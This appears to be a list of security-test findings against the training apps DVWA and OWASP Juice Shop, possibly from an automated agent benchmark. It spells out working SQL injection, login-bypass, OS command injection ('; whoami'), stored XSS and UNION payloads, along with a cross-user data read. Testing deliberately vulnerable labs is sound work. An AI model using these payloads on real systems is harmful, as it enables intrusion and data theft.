findings.title: SQL Injection in DVWA SQLi page (id parameter) [security=low]
request_sequence: GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit (session dvwa_admin, security=low) -> 200
GET http://dvwa/vulnerabilities/sqli/?id=1' AND '1'='2&Submit=Submit (session dvwa_admin, security=low) -> 200
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 seeded user records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned no records (the 'User ID:' block is empty, with no 'ID:' / 'Surname:' rows). Differential confirms boolean SQL injection in the quoted id parameter. Session: admin, Security Level: low, SQLi DB: mysql.

findings.title: OS Command Injection in DVWA Command Injection page (ip parameter) [security=low]
request_sequence: POST http://dvwa/vulnerabilities/exec/ (session dvwa_admin, security=low) form_data: ip=127.0.0.1; whoami&Submit=Submit -> 200
findings.response_evidence: [security=low] Response contained the normal ping output (4 packets transmitted, 4 received, 0% packet loss) followed by the injected command output line 'www-data' before 'More Information'. The web-process identity www-data is present, so the ';' injection executed an OS command.

findings.title: Login authentication bypass SQL injection on POST /rest/user/login (email field)
request_sequence: POST http://juiceshop:3000/rest/user/login (session unauth) JSON body: {"email": "' OR 1=1--", "password": "x"} -> 200
findings.response_evidence: HTTP 200 application/json: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. A valid authentication token was issued for the first user admin@juice-sh.op with an arbitrary password, which confirms the SQL injection in the email field bypassed authentication.

findings.title: Stored XSS in DVWA Guestbook message field [security=low]
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin, security=low) -> token-less form, fields txtName/mtxMessage/btnSign

POST http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) form: txtName=xssv, mtxMessage=<script id="test_token">window.xss_flag=1</script> (58 chars, exceeds client maxlength=50; server accepted), btnSign=Sign Guestbook -> 200
browser_navigate http://dvwa/vulnerabilities/xss_s/ (session dvwa_admin)
browser_eval_js: String(window.xss_flag)
findings.response_evidence: [security=low] POST returned 200 and the guestbook re-rendered with new entry 'Name: xssv'. The server stored the 58-char canary despite the client-side maxlength=50. On browser load of /vulnerabilities/xss_s/ as dvwa_admin, browser_eval_js("window.xss_flag") returned "1". Canary script executed in the victim's (admin's) rendering context.
findings.browser_js_evidence: browser_eval_js expression 'String(window.xss_flag)' -> result: "1" (URL http://dvwa/vulnerabilities/xss_s/, session dvwa_admin)

findings.title: BOLA: juiceshop_acct2 can read juiceshop_acct1's basket via GET /rest/basket/{id}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (juiceshop_acct1; session_info.own_basket_id=6, email acct1_bench@juiceshop.local)
GET http://juiceshop:3000/rest/basket/7 (juiceshop_acct2; own_basket_id=7)
GET http://juiceshop:3000/rest/basket/6 (juiceshop_acct2, cross-user request)
findings.response_evidence: Acct1 own basket 6 (UserId 22): Products=[{name:"Apple Juice (1000ml)", BasketItem:{id:9, BasketId:6, quantity:3}}]. Acct2 own basket 7 (UserId 23) contains only Orange Juice (1000ml) qty 1 (BasketItem id 10). Acct2 GET /rest/basket/6 returned 200 status:success with UserId 22 and the full acct1 contents: "Apple Juice (1000ml)", BasketItem quantity 3, id 9. Acct1's distinct item was retrieved by acct2, which does not own that basket (BOLA, no ownership check).

findings.title: Juice Shop unauthenticated /api/Feedbacks: author emails masked, not disclosed in clear
request_sequence: GET http://juiceshop:3000/api/Feedbacks (unauth)
findings.response_evidence: Unauthenticated GET returned HTTP 200 with 8 feedback records. Fields returned: UserId, id, comment, rating, createdAt, updatedAt. No email field exists. Author emails appear only inside comment text and are masked: e.g. '{"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"}', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Other records show '(anonymous)' or UserId null. Emails are only partially masked, so the PII disclosure criterion (unmasked emails) is not met. Verdict: inconclusive per assignment; no further budget spent.

findings.title: Product-Search SQL Injection on GET /rest/products/search?q= (unauth)
request_sequence: GET /rest/products/search?q=apple (unauth) -> 200 application/json {status:success, data:[Apple Juice (1000ml), Apple Pomace...]} (benign baseline, no error)
GET /rest/products/search?q=qwert' (unauth) -> 500 text/html 'Error: SQLITE_ERROR: near "'%'": syntax error'

GET /rest/products/search?q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- (unauth) -> 200 application/json {status:success, data:[{id:1,name:2,description:3,price:4,deluxePrice:5,image:6,createdAt:7,updatedAt:8,deletedAt:9}]}
findings.response_evidence: Benign q=apple returns 200 with normal product rows and no error. Single quote q=qwert' returns HTTP 500 with 'SQLITE_ERROR: near \"'%'\": syntax error'. UNION probe with 9 columns returns HTTP 200 where the injected literal values 2..9 are reflected in the product fields (name:2, description:3, price:4 ... deletedAt:9), proving attacker-controlled SQL in the query. Both the SQL error and the successful UNION are observed versus the benign baseline.

findings.title: DVWA security.php level change: CSRF token enforced (candidate not vulnerable)
request_sequence: [security=low] GET http://dvwa/security.php (dvwa_admin) -> token d0231961db26307f8550500dcc16fc28, level low
POST http://dvwa/security.php security=high&seclev_submit=Submit (NO user_token) (dvwa_admin) -> 302 redirect 'security.php'; GET shows level still low and page text 'CSRF token is incorrect'

POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] (dvwa_admin) -> 302 redirect '/security.php'; GET shows 'Security level set to high' / 'Security level is currently: high'
POST http://dvwa/security.php security=low&seclev_submit=Submit&user_token=[REDACTED] (restore) -> 302; GET shows 'Security level set to low', level low
findings.response_evidence: [security=low] The security-level form enforces a per-page user_token. A POST without user_token was rejected: the follow-up page displays 'CSRF token is incorrect' and the level remained 'low'. The same POST with the valid token from the rendered form succeeded: the page displayed 'Security level set to high'. The level was then restored to low with a fresh token. Because the state-changing request is gated by a valid, page-bound anti-CSRF token, a cross-site forged POST without the token is ignored, so the CWE-352 candidate is not exploitable as CSRF. Verdict: rejected (anti-CSRF token is enforced). Note: the token check is a valid defense; the observed behavior does not support the suspected CWE.
